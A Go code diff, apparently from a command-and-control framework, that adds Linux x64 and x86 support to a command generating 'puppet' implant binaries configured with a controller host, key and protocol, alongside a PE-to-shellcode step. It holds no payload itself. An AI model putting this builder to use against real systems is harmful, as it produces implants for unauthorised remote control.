@@ -51,6 +51,8 @@ var generateCmd = &grumble.Command{
 		fileType := c.Flags.String("type")
 		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
 		target := c.Flags.String("target")
+		dProtoStr := c.Flags.String("proto")
+
 		if strings.TrimSpace(target) == "" {
 			target = fmt.Sprintf("files/%s.bin", timeStr)
 		}
@@ -103,11 +105,45 @@ var generateCmd = &grumble.Command{
 			}
 			break
 		case "linux/x64":
-			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
-			return nil
+			if !generateopt.IsLnxType(fileType) {
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
+				return nil
+			}
+			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_linux_x64")
+			if fileType == "elf" {
+				stubPath = puppetPath
+			}
+			if !fileopt.IsFile(stubPath) {
+				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+				return nil
+			}
+			if !fileopt.IsFile(puppetPath) {
+				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+				return nil
+			}
+			break
 		case "linux/x86":
-			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
-			return nil
+			if !generateopt.IsLnxType(fileType) {
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
+				return nil
+			}
+			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_linux_x86")
+			if fileType == "elf" {
+				stubPath = puppetPath
+			}
+			if !fileopt.IsFile(stubPath) {
+				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+				return nil
+			}
+			if !fileopt.IsFile(puppetPath) {
+				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+				return nil
+			}
+			break
 		case "darwin/x64":
 			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
 			return nil
@@ -125,7 +161,6 @@ var generateCmd = &grumble.Command{
 		}
 		params := fmt.Sprintf("-host=%s -key=%s", host, key)
 
-		// 将pe文件转shellcode
 		savePath := "tmp/bin"
 		if !fileopt.IsDir(savePath) {
 			err := os.Mkdir("tmp", 0666)
@@ -144,6 +179,13 @@ var generateCmd = &grumble.Command{
 		dstFile := new(string)
 		*srcFile = puppetPath
 		*dstFile = saveFile
+		stubData, err := ioutil.ReadFile(stubPath)
+
+		if platform == "linux/x64" || platform == "linux/x86" {
+			generateopt.BuildMap[fileType](stubData, host, dProtoStr, target, key, outputPath)
+			return nil
+		}
+		// 将pe文件转shellcode
 		shellcode.PE2ShellCode(srcFile, dstFile, &params)
 
 		// 发送文件元信息
@@ -166,10 +208,7 @@ var generateCmd = &grumble.Command{
 		}
 		time.Sleep(100 * time.Millisecond)
 
-		stubData, err := ioutil.ReadFile(stubPath)
-		dProtoStr := c.Flags.String("proto")
-
-		generateopt.BuildMap[fileType](stubData, host, dProtoStr, target, outputPath)
+		generateopt.BuildMap[fileType](stubData, host, dProtoStr, target, key, outputPath)
 		return nil
 	},
 }
